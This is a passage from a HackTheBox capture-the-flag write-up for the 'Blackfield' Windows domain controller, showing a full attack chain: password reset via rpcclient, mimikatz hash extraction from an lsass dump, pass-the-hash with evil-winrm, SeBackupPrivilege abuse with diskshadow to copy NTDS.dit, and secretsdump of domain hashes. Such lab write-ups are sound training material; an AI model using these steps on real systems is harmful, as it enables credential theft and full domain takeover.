SeLoadDriverPrivilege           0:10 (0x0:0xa)
SeSystemProfilePrivilege                0:11 (0x0:0xb)
SeSystemtimePrivilege           0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)
SeCreatePagefilePrivilege               0:15 (0x0:0xf)
SeCreatePermanentPrivilege              0:16 (0x0:0x10)
SeBackupPrivilege               0:17 (0x0:0x11)
SeRestorePrivilege              0:18 (0x0:0x12)
SeShutdownPrivilege             0:19 (0x0:0x13)
SeDebugPrivilege                0:20 (0x0:0x14)
SeAuditPrivilege                0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)
SeChangeNotifyPrivilege                 0:23 (0x0:0x17)
SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
SeUndockPrivilege               0:25 (0x0:0x19)
SeSyncAgentPrivilege            0:26 (0x0:0x1a)
SeEnableDelegationPrivilege             0:27 (0x0:0x1b)
SeManageVolumePrivilege                 0:28 (0x0:0x1c)
SeImpersonatePrivilege          0:29 (0x0:0x1d)
SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)
SeRelabelPrivilege              0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)
SeTimeZonePrivilege             0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)
```
### Checking the privileges of `support` using `rpcclient`, I came to see that `support` can change the password of the other users.

> This link can help in understanding this in more detail
[https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/).

## Using `rpcclient` to change the password of `audit2020`.

`rpcclient $> setuserinfo2 audit2020 23 'Password@123'`

So I've successfully changed the password of `audit2020`.

### From the `smb` enumeration in the starting, there is a folder called `forensic`, with the help of user `audit2020` I can see the things in it.

``` python
root@Ac3:~# smbclient  //blackfield.htb/forensic -U audit2020
Enter WORKGROUP\audit2020's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                7846143 blocks of size 4096. 3821004 blocks available
smb: \> 

```
### As we can see that that thing `works`.

### Checking Juicy Info

``` shell
smb: \> cd commands_output
smb: \commands_output\> ls
  .                                   D        0  Sun Feb 23 13:14:37 2020
  ..                                  D        0  Sun Feb 23 13:14:37 2020
  domain_admins.txt                   A      528  Sun Feb 23 08:00:19 2020
  domain_groups.txt                   A      962  Sun Feb 23 07:51:52 2020
  domain_users.txt                    A    16454  Fri Feb 28 17:32:17 2020
  firewall_rules.txt                  A   518202  Sun Feb 23 07:53:58 2020
  ipconfig.txt                        A     1782  Sun Feb 23 07:50:28 2020
  netstat.txt                         A     3842  Sun Feb 23 07:51:01 2020
  route.txt                           A     3976  Sun Feb 23 07:53:01 2020
  systeminfo.txt                      A     4550  Sun Feb 23 07:56:59 2020
  tasklist.txt                        A     9990  Sun Feb 23 07:54:29 2020

                7846143 blocks of size 4096. 3821004 blocks available
smb: \commands_output\> cd ..
smb: \> cd memory_analysis
smb: \memory_analysis\> ls
  .                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020                                                                                                                                                                 
  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020                                                                                                                                                                 
  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020                                                                                                                                                                 
  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020                                                                                                                                                                 
  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020                                                                                                                                                                 
  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020                                                                                                                                                                 
  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020                                                                                                                                                                 
                                                                                                                                                                                                                                           
                7846143 blocks of size 4096. 3821004 blocks available                                                                                                                                                                      
smb: \memory_analysis\>  
```
### So from the above we can see `lsass.zip` in `memory_analysis` folder, now I can extract the `lsass.zip` and use `mimikatz` to get the `NTLM` hash.

``` ruby
oot@Ac3:~# smbclient  //blackfield.htb/forensic -U audit2020                                                                                                                                                                              
Enter WORKGROUP\audit2020's password: 
Try "help" to get a list of possible commands.
smb: \> cd memory_analysis
smb: \memory_analysis\> get lsass.zip
parallel_read returned NT_STATUS_IO_TIMEOUT
smb: \memory_analysis\> get lsass.zip
getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (1099.1 KiloBytes/sec) (average 1099.1 KiloBytes/sec)
smb: \memory_analysis\> 
```
## Using Mimikatz

There are many blogs which are helpful how to use `mimikatz` for `hashdump` from `lsass `

``` ruby
mimikatz_trunk\x64>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # sekurlsa::minidump lsass.DMP
Switch to MINIDUMP : 'lsass.DMP'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.DMP' file for minidump...

Authentication Id : 0 ; 406458 (00000000:000633ba)
Session           : Interactive from 2
User Name         : svc_backup
Domain            : BLACKFIELD
Logon Server      : DC01
Logon Time        : 2/23/2020 11:30:03 PM
SID               : S-1-5-21-4194615774-2175524697-3563712290-1413
        msv :
         [00000003] Primary
         * Username : svc_backup
         * Domain   : BLACKFIELD
         * NTLM     : 9658d1d1dcd9250115e2205d9f48400d
         * SHA1     : 463c13a9a31fc3252c68ba0a44f0221626a33e5c
         * DPAPI    : a03cd8e9d30171f3cfe8caad92fef621
        tspkg :
        wdigest :
         * Username : svc_backup
         * Domain   : BLACKFIELD
         * Password : (null)
        kerberos :
         * Username : svc_backup
         * Domain   : BLACKFIELD.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 153705 (00000000:00025869)
Session           : Interactive from 1
User Name         : Administrator
Domain            : BLACKFIELD
Logon Server      : DC01
Logon Time        : 2/23/2020 11:29:04 PM
SID               : S-1-5-21-4194615774-2175524697-3563712290-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : BLACKFIELD
         * NTLM     : 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
         * SHA1     : db5c89a961644f0978b4b69a4d2a2239d7886368
         * DPAPI    : 240339f898b6ac4ce3f34702e4a89550
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : BLACKFIELD
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : BLACKFIELD.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 40310 (00000000:00009d76)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/23/2020 11:27:46 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DC01$
         * Domain   : BLACKFIELD
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        tspkg :
        wdigest :
         * Username : DC01$
         * Domain   : BLACKFIELD
         * Password : (null)
        kerberos :
         * Username : DC01$
         * Domain   : BLACKFIELD.local
         * Password : &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        ssp :
        credman :



Authentication Id : 0 ; 406499 (00000000:000633e3)
Session           : Interactive from 2
User Name         : svc_backup
Domain            : BLACKFIELD
Logon Server      : DC01
Logon Time        : 2/23/2020 11:30:03 PM
SID               : S-1-5-21-4194615774-2175524697-3563712290-1413
        msv :
         [00000003] Primary
         * Username : svc_backup
         * Domain   : BLACKFIELD
         * NTLM     : 9658d1d1dcd9250115e2205d9f48400d
         * SHA1     : 463c13a9a31fc3252c68ba0a44f0221626a33e5c
         * DPAPI    : a03cd8e9d30171f3cfe8caad92fef621
        tspkg :
        wdigest :
         * Username : svc_backup
         * Domain   : BLACKFIELD
         * Password : (null)
        kerberos :
         * Username : svc_backup
         * Domain   : BLACKFIELD.LOCAL
         * Password : (null)
        ssp :
        credman :


```

### At this point I was a little exited as I got the `Admin ` hash, But yeah `Don't expect anything to be simple`.
### So I tried to crack the hash of `SVC-Backup` but no luck, So I tried to pass the hash using `Evil-winrm`.

` evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i blackfield.htb`

### It was a Success!

``` 
 evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i blackfiled.htb

 Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents>
```
## Getting User.txt
``` python
*Evil-WinRM* PS C:\Users\svc_backup> cd Desktop
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
3e666----------------------------30a             
```
## Privilege Escalation

### Seeing the privileges of `svc-backup`

``` shell
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /all

USER INFORMATION                                                                                                                                                                            
----------------
User Name             SID                                                                                                                                                                                                                  
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413                                                                                                                                                                     
GROUP INFORMATION                                                                                                                                                                                                                          
-----------------

Group Name                                 Type             SID          Attributes                                                                                                                                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

### Enumerating you will find notes.txt and since svc_backup has backup ability robocopy can be exploited in a way.


[https://pentestlab.blog/tag/diskshadow/](https://pentestlab.blog/tag/diskshadow/)

``` ruby
root@Ac3:~# cat jeevan.txt 
SET CONTEXT PERSISTENT NOWRITERS#
add volume c: alias jeevan#
createp#
expose %jeevan% z:#
```



``` shell

*Evil-WinRM* PS C:\Windows\temp> diskshadow /s jeevan.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  7/11/2020 2:44:35 PM

-> SET CONTEXT PERSISTENT NOWRITERS
-> add volume c: alias jeevan
-> create
Alias jeevan for shadow ID {64f5cc48-8cd1-4d3a-9393-504db85af469} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {95cfeba5-f3b5-43bc-ad73-c6bcee2bc475} set as environment variable.

Querying all shadow copies with the shadow copy set ID {95cfeba5-f3b5-43bc-ad73-c6bcee2bc475}

        * Shadow copy ID = {64f5cc48-8cd1-4d3a-9393-504db85af469}               %jeevan%
                - Shadow copy set: {95cfeba5-f3b5-43bc-ad73-c6bcee2bc475}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 7/11/2020 2:44:35 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %jeevan% z:
-> %jeevan% = {64f5cc48-8cd1-4d3a-9393-504db85af469}
The shadow copy was successfully exposed as z:\.
->
*Evil-WinRM* PS C:\Windows\temp> ls


    Directory: C:\Windows\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/11/2020   2:44 PM            628 2020-07-11_14-44-35_DC01.cab
-a----        7/11/2020   2:44 PM             90 jeevan.txt
-a----        7/11/2020   1:13 PM         135470 MpCmdRun.log
-a----        7/11/2020  12:42 PM            102 silconfig.log
------        7/11/2020  12:42 PM          63072 vmware-vmsvc.log
------        7/11/2020  12:43 PM          15832 vmware-vmusr.log
-a----        7/11/2020  12:42 PM           1728 vmware-vmvss.log


*Evil-WinRM* PS C:\Windows\temp> 
```

At this point I realised the privs of `svc-backup` 

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
## To get the `NTDS.dit` I need to fool the system in order to do so.

[https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)


## After Uploading both the `.dll` files.

``` shell
*Evil-WinRM* PS C:\Windows\temp> upload SeBackupPrivilegeCmdLets.dll
Info: Uploading SeBackupPrivilegeCmdLets.dll to C:\Windows\temp\SeBackupPrivilegeCmdLets.dll

                                                             
Data: 16384 bytes of 16384 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Windows\temp> upload SeBackupPrivilegeUtils.dll
Info: Uploading SeBackupPrivilegeUtils.dll to C:\Windows\temp\SeBackupPrivilegeUtils.dll

                                                             
Data: 21844 bytes of 21844 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Windows\temp> 
```
## Time to import the modules.

>`*Evil-WinRM* PS C:\Windows\temp> import-module .\SeBackupPrivilegeUtils.dll`
>`*Evil-WinRM* PS C:\Windows\temp> import-module .\SeBackupPrivilegeCmdLets.dll`


### Time to copy `NTDS.dit` 

``` ruby
*Evil-WinRM* PS C:\Windows\temp> Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\Windows\temp\ndts.dit
*Evil-WinRM* PS C:\Windows\temp> ls


    Directory: C:\Windows\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/11/2020   2:44 PM            628 2020-07-11_14-44-35_DC01.cab
-a----        7/11/2020   2:44 PM             90 jeevan.txt
-a----        7/11/2020   1:13 PM         135470 MpCmdRun.log
-a----        7/11/2020   2:56 PM       18874368 ndts.dit
-a----        7/11/2020   2:54 PM          12288 SeBackupPrivilegeCmdLets.dll
-a----        7/11/2020   2:54 PM          16384 SeBackupPrivilegeUtils.dll
-a----        7/11/2020  12:42 PM            102 silconfig.log
------        7/11/2020  12:42 PM          63072 vmware-vmsvc.log
------        7/11/2020  12:43 PM          15832 vmware-vmusr.log
-a----        7/11/2020  12:42 PM           1728 vmware-vmvss.log


*Evil-WinRM* PS C:\Windows\temp> 

```

### File successfully copied...
`-a----        7/11/2020   2:56 PM       18874368 ndts.dit`


### Having only `NTDS.dit` is not going to help, so i need one more file ie `SYSTEM`

``` python
*Evil-WinRM* PS C:\Windows\temp> reg save hklm\system C:\Windows\temp\system.bak
The operation completed successfully.

*Evil-WinRM* PS C:\Windows\temp> ls


    Directory: C:\Windows\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/11/2020   2:44 PM            628 2020-07-11_14-44-35_DC01.cab
-a----        7/11/2020   2:44 PM             90 jeevan.txt
-a----        7/11/2020   1:13 PM         135470 MpCmdRun.log
-a----        7/11/2020   2:56 PM       18874368 ndts.dit
-a----        7/11/2020   2:54 PM          12288 SeBackupPrivilegeCmdLets.dll
-a----        7/11/2020   2:54 PM          16384 SeBackupPrivilegeUtils.dll
-a----        7/11/2020  12:42 PM            102 silconfig.log
-a----        7/11/2020   3:01 PM       17346560 system.bak
------        7/11/2020  12:42 PM          63072 vmware-vmsvc.log
------        7/11/2020  12:43 PM          15832 vmware-vmusr.log
-a----        7/11/2020  12:42 PM           1728 vmware-vmvss.log


*Evil-WinRM* PS C:\Windows\temp> 
```
### As I've got both the required files, now its time to download the files to dump `secrets`..

``` python
*Evil-WinRM* PS C:\Windows\Temp> download ndts.dit
Info: Downloading C:\Windows\Temp\ndts.dit to ndts.dit

Progress: 11% : |▒░░░░░░░░░| 


*Evil-WinRM* PS C:\Windows\temp> download system.bak
Info: Downloading C:\Windows\temp\system.bak to system.bak

Progress: 6% : |▒░░░░░░░░░░|        
```
#### Wait till the procress is completed.

## Dumping `NTLM`

## Using `impacket` for `secretdump` 

### `secretsdump.py -ntds ntds.dit -system system.bak LOCAL`

``` python
secretsdump.py  -ntds ndts.dit -system system.bak LOCAL
Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ndts.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
```
### Time to get root access

## Getting Root.txt

<code>evil-winrm -H 184fb5e5178480be64824d4cd53b99ee -u Administrator -i blackfiled.htb</code>

``` python

root@Ac3:~# evil-winrm -H 184fb5e5178480be64824d4cd53b99ee -u administrator -i blackfiled.htb

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
4375a------------------------5cb
```

***

If you like my work, please do consider giving me +rep on HACKTHEBOX.  
My HackTheBox profile: [https://www.hackthebox.eu/home/users/profile/291968](https://www.hackthebox.eu/home/users/profile/291968)

